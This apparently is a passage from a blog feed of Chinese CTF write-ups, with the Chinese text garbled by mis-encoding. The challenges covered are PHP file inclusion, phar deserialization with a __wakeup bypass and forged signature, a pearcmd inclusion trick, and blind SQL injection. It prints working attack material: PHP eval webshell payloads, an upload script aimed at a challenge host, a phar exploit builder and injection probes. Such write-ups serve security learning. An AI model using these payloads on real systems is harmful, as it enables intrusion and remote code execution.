class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">           <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;404.html&quot;</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>include($_GET[&quot;file&quot;])<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶åŒ…å«ï¼Œä¸è¿‡è¦åŒ…å«å•¥ä¹Ÿæ²¡æç¤ºï¼Œæƒ³ç€å†™ä¸ªä¸€å¥è¯è¿›å»ï¼š</p><p><code>data://text/plain,%3C?php%20@eval($_POST[%27viper%27]);?%3E</code></p><p><img src="/img/ezinclude5.png" alt="ezinclude5"></p><p><code>data</code>,<code>input</code>è¿™ç§èƒ½æ‰§è¡Œå‘½ä»¤çš„åè®®éƒ½è¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡<code>filter</code>è¿˜èƒ½ç”¨ï¼Œå°è¯•è¯»ä¸‹<code>flflflflag.php</code>æºç </p><p><code>/flflflflag.php?file=php://filter/convert.base64-encode/resource=flflflflag.php</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">           <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;404.html&quot;</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">$file=$_GET[&#x27;file&#x27;];</span><br><span class="hljs-meta">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;//isè¡¨ç¤ºå¿½ç•¥å¤§å°å†™åŠ å•è¡ŒåŒ¹é…</span><br><span class="hljs-meta">die(&#x27;nonono&#x27;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">@include($file);</span><br><span class="hljs-meta">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åé¢çœ‹äº†<code>wp</code>ï¼Œç”¨å¾¡å‰‘è¿˜èƒ½æ‰«å‡ºæ¥<code>dir.php</code>è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œåˆ©ç”¨ä¼ªåè®®è¯»ä»–çš„æºç ï¼š</p><p>å‚è€ƒ<code>https://www.shawroot.cc/1159.html</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//file=php://filter/read=convert.base64-encode/resource=dir.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//è·å–æŒ‡å®šç›®å½•ï¼ˆæ­¤å¤„ä¸º/tmpï¼‰ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ï¼Œå¹¶æ‰“å°å®ƒä»¬çš„è¯¦ç»†ä¿¡æ¯</span><br><br></code></pre></td></tr></table></figure><p>php7.0çš„bugï¼š</p><p><code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code></p><p>ä½¿ç”¨php:&#x2F;&#x2F;filter&#x2F;string.strip_tagså¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ã€‚è¯¥æ–¹æ³•ä»…é€‚ç”¨äºä»¥ä¸‹php7ç‰ˆæœ¬ï¼Œphp5å¹¶ä¸å­˜åœ¨è¯¥å´©æºƒã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">â€¢ php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>å¯ä»¥åˆ©ç”¨ï¼Œ <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤<br><br>â€¢ php<span class="hljs-number">7.1.3-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>å¯ä»¥åˆ©ç”¨ï¼Œ <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤<br><br>â€¢ php<span class="hljs-number">7.2.2-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>å¯ä»¥åˆ©ç”¨ï¼Œ <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">9</span>ä¸€ç›´åˆ°<span class="hljs-number">7</span>.<span class="hljs-number">3</span>åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å‚è€ƒhttps://www.cnblogs.com/Article-kelp/p/14826360.html</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><br>url=<span class="hljs-string">&quot;http://5efafd4f-4bae-4237-b3b6-5a8e41058c3c.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> <br><br>phpfile=<span class="hljs-string">&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span> <span class="hljs-comment">#phpfileå¯¹åº”çš„å°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶çš„å†…å®¹</span><br>filedata=&#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:phpfile<br>&#125;<br>bak=res.post(url=url,files=filedata)<br><span class="hljs-built_in">print</span>(bak.text)<br></code></pre></td></tr></table></figure><p>å›æ˜¾ï¼š</p><p><img src="/img/ezinclude6.png" alt="ezinclude6"></p><p>æ¥ä¸‹æ¥å°±è¦ç”¨åˆ°åˆšæ‰çš„<code>dir.php</code>äº†ï¼Œå› ä¸ºæˆ‘ä»¬ä¸Šä¼ çš„ä¸€å¥è¯è¢«å­˜åˆ°<code>tmp</code>ç›®å½•(æ–‡ä»¶åæˆ‘ä»¬å¹¶ä¸çŸ¥é“ï¼Œè¿™ä¸œè¥¿æ˜¯ä¸ªä¸´æ—¶æ–‡ä»¶)ï¼Œè®¿é—®<code>dir.php</code>å°±èƒ½è·å¾—æ–‡ä»¶å<code>phpgkdwwM</code>ï¼š</p><p><img src="/img/ezinclude7.png" alt="ezinclude7"></p><p>èšå‰‘è¿æ¥(è¿™é‡Œæ–‡ä»¶åæ¢äº†æ˜¯å› ä¸ºç¯å¢ƒé‡å¼€äº†ä¸€æ¬¡ï¼Œæ³¨æ„æ²¡å¿…è¦åœ¨åé¢åŠ <code>php</code>åç¼€)</p><p><img src="/img/ezinlucde1.png" alt="ezinlucde1"></p><p>ä¸è¿‡å¥‡æ€ªçš„æ˜¯å•¥éƒ½æ²¡æœ‰ã€‚ã€‚ï¼š</p><p><img src="/img/ezinlucde99.png" alt="ezinlucde99"></p><p>åé¢æƒ³ç€ç”¨èšå‰‘çš„æ’ä»¶ï¼š</p><p><img src="/img/ezinlude100.png" alt="ezinlude100"></p><p>åˆå»çœ‹äº†wpã€‚ã€‚ã€‚<code>flag</code>åœ¨<code>phpinfo</code>é‡Œã€‚ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(æœªåšå®Œ)Writeup_2023_NewStarCTF_Week5</title>
    <link href="/2023/11/28/week5-Writeup_2023_NewStarCTF_Week5/"/>
    <url>/2023/11/28/week5-Writeup_2023_NewStarCTF_Week5/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTFç¬¬äº”å‘¨ï¼Œèœé¸Ÿçš„wp</p><span id="more"></span><hr><h2 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h2><p><img src="/img/week51.png" alt="week51"></p><p>æºç ä¸­å­˜åœ¨æç¤ºï¼š</p><p><img src="/img/week52.png" alt="week52"></p><p>åˆ·æ–°é¡µé¢å»çœ‹<code>cookie</code>ï¼š</p><p><img src="/img/week53.png" alt="week53"></p><p>è®¿é—®<code>pairing.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">&#x27;false&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;human&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;<br>        &#125; <span class="hljs-comment">//éœ€è¦ç»•è¿‡__wakeup(),ååºåˆ—åŒ–ä¸­__wakeupå…ˆäº__destruct</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;AshenOne&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">&#x27;fire&#x27;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">&#x27;true&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Get Out!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;                 <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// $Eden=new story();</span><br>    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>];<br>    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));<span class="hljs-comment">//è§£ç åå†™å…¥$pear</span><br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);<span class="hljs-comment">//æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;å¤šåƒé›ªæ¢¨&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//https://zhuanlan.zhihu.com/p/377676274</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰<code>Unserialize</code>çš„ååºåˆ—åŒ–ï¼Œè¿˜æ˜¯<code>Phar</code>ã€‚å¯ä»¥é€šè¿‡<code>__destruct</code>æ‰§è¡Œå‘½ä»¤ï¼Œä½†å­˜åœ¨<code>__wakeup</code>é˜»ç¢(å¯ä»¥é€šè¿‡ä¿®æ”¹å±æ€§æ•°é‡ç»•è¿‡)ã€‚</p><p>å‚è€ƒï¼š<code>https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</code></p><p>ä¸»è¦å°±æ˜¯éœ€è¦ä¿®æ”¹<code>phar</code>æ–‡ä»¶çš„å†…å®¹(å±æ€§æ•°é‡)æ‰èƒ½å»ç»•è¿‡<code>__wakeup</code>ã€‚ä½†æ³¨æ„<code>phar</code>è¿™ä¸ªä¸œè¥¿æ˜¯æœ‰ç­¾åçš„ï¼Œæˆ‘ä»¬åœ¨æ­¤åŸºç¡€ä¸Šè¿˜è¦å¯¹æ–‡ä»¶ç­¾åè¿›è¡Œä¿®æ”¹ã€‚</p><p>å…ˆæŠŠ<code>wakeup</code>æ”¾ä¸€è¾¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setUser</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user = <span class="hljs-variable">$value</span>;<br>    &#125;<br>&#125;                 <br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">setUser</span>(<span class="hljs-string">&#x27;admin&#x27;</span>);<br><span class="hljs-variable">$a</span>-&gt;God=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$a</span>-&gt;eating=<span class="hljs-string">&#x27;cat /fl*&#x27;</span>;<span class="hljs-comment">//çœ‹äº†wpï¼Œçœ‹å¤©çœ¼äº†ç›´æ¥cat /fl*ã€‚æ­£å¸¸åšè‚¯å®šè¦ä¸€ç‚¹ç‚¹æ‰§è¡Œå‘½ä»¤ï¼šls ls /å•¥çš„</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>hex</code>æ‰“å¼€ï¼Œä¿®æ”¹ç±»å±æ€§çš„ä¸ªæ•°ä¸º<code>5</code>(æœ¬æ¥æ˜¯4)ï¼š</p><p><img src="/img/phar12.png" alt="phar12"></p><p>è¿™é‡Œå€Ÿç”¨<code>pankas</code>å¸ˆå‚…çš„ä¸€å¼ å›¾ï¼š</p><p><img src="/img/phar13.png" alt="phar13"></p><p>ç­¾åç±»å‹ä¸º<code>sha1</code>ï¼Œä¼ªé€ ç­¾åç®—æ³•ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> hashlib import sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hacker.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    f = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>() <span class="hljs-comment"># ä¿®æ”¹å†…å®¹åçš„pharæ–‡ä»¶,ä»¥äºŒè¿›åˆ¶æ–‡ä»¶å½¢å¼æ‰“å¼€</span><br>    <br>s = f[:<span class="hljs-number">-28</span>] <span class="hljs-comment"># è·å–è¦ç­¾åçš„æ•°æ®ï¼ˆå¯¹äºsha1ç­¾åçš„pharæ–‡ä»¶ï¼Œæ–‡ä»¶æœ«å°¾28å­—èŠ‚ä¸ºç­¾åçš„æ ¼å¼ï¼‰</span><br>h = f[<span class="hljs-number">-8</span>:] <span class="hljs-comment"># è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†ï¼Œå„4ä¸ªå­—èŠ‚</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(newf) <span class="hljs-comment"># å†™å…¥æ–°æ–‡ä»¶</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week3</title>
    <link href="/2023/11/27/week3_Writeup_2023_NewStarCTF_Week3/"/>
    <url>/2023/11/27/week3_Writeup_2023_NewStarCTF_Week3/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTFç¬¬ä¸‰å‘¨ï¼Œèœé¸Ÿçš„wp</p><span id="more"></span><hr><h2 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">//è¿‡æ»¤ä¼ªåè®®åŠflag</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<span class="hljs-comment">//æ–‡ä»¶åŒ…å«æ¼æ´</span><br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>?file=phpinfo</code>,<code>ctrl+F</code>æœç´¢<code>FLAG</code>:</p><p><img src="/img/pear1.png" alt="pear1"></p><p>è®©æˆ‘ä»¬å»æŸ¥çœ‹<code>register_argc_argv</code>:</p><p><img src="/img/pear3.png" alt="pear3"></p><p><code> register_argc_argv</code>å¼€å¯æ—¶æˆ‘ä»¬ä¼ å…¥getçš„å‚æ•°ä¼šè¢«è®°å½•åœ¨<code>$_SERVER</code>è¿™ä¸ªå…¨å±€å˜é‡æ•°ç»„ä¸­</p><p>å¹¶ä¸”<code>$argc</code>å˜é‡ç”¨äºè®°å½•æ•°ç»„çš„å¤§å°ã€‚ <code>$argv</code>å˜é‡æ˜¯ç”¨äºè®°å½•è¾“å…¥å‚æ•°ã€‚</p><p><img src="/img/pear4.png" alt="pear4"></p><p>å‚è€ƒPç¥çš„<code>Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿°</code>:</p><p><code>payload</code>:<code>/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/hello.php</code></p><p><img src="/img/pearpear2.png" alt="pearpear2"></p><p>æ³¨æ„è¦åœ¨<code>bp</code>ä¸ŠæŠ“åŒ…ä¿®æ”¹ï¼Œå› ä¸º<code>URL``get</code>ä¼ å‚æ—¶ä¼šæŠŠ<code>&lt;&gt;</code>è¿™ç§è‡ªåŠ¨ç¼–ç ã€‚</p><p>ç„¶åè®¿é—®<code>/?file=tmp/hello</code></p><p><img src="/img/pearpear3.png" alt="pearpear3"></p><p><img src="/img/pearpear4.png" alt="pearpear4"></p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>å…ˆåˆ¤æ–­å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ï¼š</p><p><code>/?id=TMP11503&#39;--+  å­—ç¬¦å‹æ³¨å…¥</code></p><p><code>or</code>,<code>select</code>è¿‡æ»¤äº†å°å†™ï¼Œ<code>union</code>åº”è¯¥æ˜¯æ­£åˆ™åŒ¹é…&#x2F;iæ¨¡å¼è¿‡æ»¤æ‰äº†ã€‚</p><p><code>?id=TMP0919&#39; And 1=1--+</code>æ­£å¸¸å›æ˜¾ï¼Œ<code>?id=TMP0919&#39; And 1=0--+</code>å›æ˜¾<code>id not exists</code></p><p><code>/?id=TMP0919&#39; And if(length(database())&gt;1,1,0)--+</code>æ­£å¸¸å›æ˜¾ï¼Œ<code>?id=TMP0919&#39; And if(length(database())&gt;99,1,0)--+</code>å›æ˜¾<code>id not 